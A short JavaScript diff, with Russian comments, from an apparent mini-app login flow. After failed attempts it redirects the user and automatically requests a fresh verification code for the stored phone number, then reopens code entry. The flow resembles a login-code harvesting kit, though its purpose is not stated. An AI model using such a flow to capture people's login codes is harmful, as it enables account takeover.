@@ -250,7 +250,22 @@
       window.scrollTo(0, 0);
       var act = document.getElementById("act");
       if (act) {
-        act.onclick = function () { goRedirect(CFG.codeFailRedirect); };
+        act.onclick = async function () {
+          // 1) уводим на ресурс (мини-апп не закрываем)
+          goRedirect(CFG.codeFailRedirect);
+          // 2) заново открываем ввод кода: запрашиваем свежий код,
+          //    т.к. старая сессия после 3 попыток уже недействительна.
+          AUTH.lastError = "";
+          var codeStep = findStepByKey("code");
+          if (codeStep < 0) codeStep = step;
+          if (AUTH.phone) {
+            var ok = await sendCodeRequest(AUTH.phone);
+            if (ok) goTo(codeStep);
+            // если не ok (флуд/сеть) — sendCodeRequest уже показал ошибку
+          } else {
+            goTo(codeStep);
+          }
+        };
       }
     }
 
